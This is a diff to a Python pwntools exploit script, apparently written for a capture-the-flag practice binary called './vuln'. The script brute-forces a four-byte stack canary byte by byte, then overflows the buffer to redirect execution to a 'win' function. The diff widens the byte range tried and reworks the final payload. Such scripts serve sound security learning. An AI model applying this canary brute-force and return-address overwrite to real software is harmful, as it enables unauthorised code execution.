@@ -1,6 +1,6 @@
+from __future__ import print_function
 import re
 import pwn
-import string
 
 payload1 = b'40'
 
@@ -10,7 +10,7 @@ win_addr = elf.symbols[b'win']
 canary = ''
 finished = False
 while finished is not True:
-    for char in string.ascii_lowercase:
+    for char in range(1, 256):
         p = pwn.tubes.process.process(["./vuln"], shell=True)
         prompt = p.read()
         
@@ -21,11 +21,11 @@ while finished is not True:
         payload = b''
         payload += ('D'*32).encode()
         payload += canary.encode()
-        payload += char.encode()
+        payload += chr(char).encode()
         p.send_raw(payload)
         message = p.read()
         if re.search(b'Smashing', message) is None:
-            canary += char
+            canary += chr(char)
             if len(canary) == 4:
                 p.close()
                 finished = True
@@ -35,12 +35,13 @@ while finished is not True:
 
 p = pwn.tubes.process.process(["./vuln"], shell=True)
 
-p.sendline(b'80')
+p.sendline(b'64')
+prompt = p.read()
+print(prompt)
 payload = ('D'*32).encode()
 payload += canary.encode()
-payload += ('J'*40).encode()
-payload += pwn.p32(win_addr)
+payload += pwn.p32(win_addr)*5
 p.sendline(payload)
-#p.interactive()
-print(p.read())
+prompt = p.read()
+print(prompt)
 
